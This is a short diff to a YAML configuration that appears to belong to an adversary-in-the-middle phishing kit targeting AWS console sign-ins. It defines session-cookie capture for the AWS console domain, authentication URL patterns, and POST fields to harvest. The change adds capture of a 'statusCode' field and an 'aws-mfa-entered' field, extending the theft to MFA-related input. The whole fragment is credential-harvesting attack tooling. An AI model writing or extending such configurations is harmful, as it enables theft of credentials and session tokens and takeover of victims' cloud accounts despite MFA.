@@ -109,7 +109,7 @@ auth_tokens:
     keys: ['.*,regexp']
   - domain: 'us-west-2.console.aws.amazon.com'
     keys: ['.*,regexp']
-    
+
 auth_urls:
   - '/authenticate'
   - '/authenticate/.*'
@@ -137,6 +137,9 @@ credentials:
     search: '([^"]*)'
     type: 'post'
   - key: 'statusCode'
+    search: '([^"]*)'
+    type: 'post'
+  - key: 'aws-mfa-entered'
     search: '([^"]*)'
     type: 'post'
   - key: ''
